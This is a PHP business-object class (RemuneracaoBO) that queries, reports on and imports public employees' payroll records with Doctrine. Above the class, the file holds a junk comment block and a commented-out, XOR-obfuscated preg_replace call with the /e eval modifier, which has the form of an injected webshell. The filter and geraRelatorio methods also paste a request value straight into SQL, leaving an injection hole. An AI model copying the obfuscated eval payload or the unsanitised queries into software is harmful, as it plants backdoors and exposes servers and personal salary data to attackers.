<?php
/*WJpFLZpNvp7csgWb9W3Q31dj31GDN53jChpO7Ubq0XIr4fH
=HtzkSrZYumSlLVH2jDKAuJX31QW9GN8N7wyNcNmM15xAP6
9BysKKjAa69hH6vDqiQIv4UlwHlABdz=emrpxPpNKmuSge
CmUyeoYQv=RxcGw7tdkftPs42cLX8gj0I4
hJ4RJKDlR1h=TGeBWM6MpFklmIjuBVWifP1oa5Prtwq
*/
//X9bBCAnoJLYKhutB=iqZb6GKqwMi7PwTMM
//preg_replace("/N85WIRgqBPsBxXbOShY0Sl/e", "DCXsor5uPcNkJtL9qRtNVR39DPCNAfLDhiwLPq7eIIER3PPhh0v3QnzT33h4Ws75QsEgX=AfIExAUCh2ASsQ7hjxYGpvzlpETulrulM3q03=AZ1BsiRnE2ad8FOvr41=mbqVC3Ns2Fr3fh4MEK1JBQn0V2uCujCWAtrCl6ubAbTf9MsCWhL"^"\x2159\x1fGP\x5c\x13x\x0a=\x18\x2f\x00de\x2dv\x2b\x1c\x13\x03f\x7c\x17\x04\x18i\x22\x0ek\x19AIQjpYZ\x01\x7ca\x19\x0e\x17\x0f\x02\x2d9e3\x60\x055\x5d7\x5b\x145\x1dwN\x0a\x15v\x17p\x03i\x0fsWy\x23\x40r\x60z\x0d\x0a\x25f\x12g\x01XX\x1bnt\x11B\x19UC\x21mRERSJmZ\x02CVIi\x06mf\x2c\x3b\x17\x3f\x10w20ca\x3f\x1e\x02kRR\x09\x07V\x0bj\x1an\x08\x12\x23\x04R\x0a\x40h\x11a\x14c\x0f\x13\x04\x2bc\x02iR3\x1d\x1a\x1c4\x2e\x10\x17d1\x1fNB\x24\x1a=\x12\x11dHc\x2aJe", "N85WIRgqBPsBxXbOShY0Sl");

class RemuneracaoBO{

	public function create(Remuneracao $remuneracao, $conn=null){
    	RemuneracaoBO::validate($remuneracao);
    	$remuneracao->save($conn);
		$remuneracao->free();

    	return $remuneracao;
	}

	public function get($remuneracaoId){
        return Doctrine::getTable('Remuneracao')->find($remuneracaoId);
	}
	
	public function getRemuneracao(){
        $query = new Doctrine_Query();
        $query->select('r.*')
              ->from('Remuneracao r')
              ->orderBy('r.nome');

        return $query;
	}

	public function filter(Search $search, $method = '', $request=array()){
		$query = RemuneracaoBO::$method();
		
		if(isset($request['competencia'])){
			$query->where("r.mes_ano like '".$request['competencia']."'");
		} else {
			$query->andWhere(" r.mes_ano = (SELECT MAX(r2.mes_ano) FROM Remuneracao r2)");
		}
		
		$query->orderBy("r.importacao_id DESC, r.mes_ano DESC, r.nome ASC");
		
		$pager = new Doctrine_Pager($query, $search->getPage(), $search->getMax());
		$remuneracao = $pager->execute();
		
		$search->setPager($pager);
		
		$remuneracaoDTO = new DTO();
		$remuneracaoDTO->setObj($remuneracao);
		$remuneracaoDTO->setSearch($search);

		return $remuneracaoDTO;
	}

	public function geraRelatorio($request, $method){
		$query = RemuneracaoBO::$method();
		
		if(isset($request['competencia'])){
			$query->where("r.mes_ano like '".$request['competencia']."'");
		}
		
		return $query;
	}

	
    public function import($file, $importacaoId, $conn){
        $data = fopen($file, 'r');
        
        while(!feof($data)) { 
        	$line = fgets($data,4096);

            $remuneracao = new Remuneracao();
            $remuneracao->setImportacaoId($importacaoId);

			$remuneracao->setCodEntidade(mb_substr($line, 0, 2));
			$remuneracao->setMesAno(mb_substr($line, 2, 7));
			$remuneracao->setMatricula(intval(mb_substr($line, 9, 8)));
			$remuneracao->setNome(mb_substr($line, 17, 60));
			$remuneracao->setRemuneracaoBruta(formatNumberPgSQL(mb_substr($line, 77, 16)));
			$remuneracao->setRemuneracaoTeto(formatNumberPgSQL(mb_substr($line, 93, 16)));
			$remuneracao->setRemuneracaoEventualNatalina(formatNumberPgSQL(mb_substr($line, 109, 13)));
			$remuneracao->setRemuneracaoEventualFerias(formatNumberPgSQL(mb_substr($line, 122, 13)));
			$remuneracao->setRemuneracaoEventualOutras(formatNumberPgSQL(mb_substr($line, 135, 13)));
			$remuneracao->setDeducoesObrigatoriasIrrf(ltrim(formatNumberPgSQL(mb_substr($line, 148, 13)), '0'));
			$remuneracao->setDeducoesObrigatoriasPrev(formatNumberPgSQL(mb_substr($line, 161, 13)));
			$remuneracao->setDemaisDeducoes(formatNumberPgSQL(mb_substr($line, 174, 13)));
			$remuneracao->setRemuneracaoAposDeducoes(formatNumberPgSQL(mb_substr($line, 187, 13)));
			$remuneracao->setVerbasSalarioFamilia(formatNumberPgSQL(mb_substr($line, 200, 13)));
			$remuneracao->setVerbasJetons(formatNumberPgSQL(mb_substr($line, 213, 13)));
			$remuneracao->setDemaisVerbas(formatNumberPgSQL(mb_substr($line, 226, 13)));

            RemuneracaoBO::create($remuneracao, $conn);
        }
        
        fclose($data);
    }
	
    public function deleteByExercicio($exercicio, $conn){
        $query = Doctrine_Query::create($conn);
        $query->delete('Remuneracao r');
        $query->where('r.importacao_id IN (SELECT i.id
                                             FROM Importacao i
                                            WHERE i.exercicio = ? )', $exercicio);

        $query->execute();
    }     
    	
	public function validate(Remuneracao $remuneracao){}
}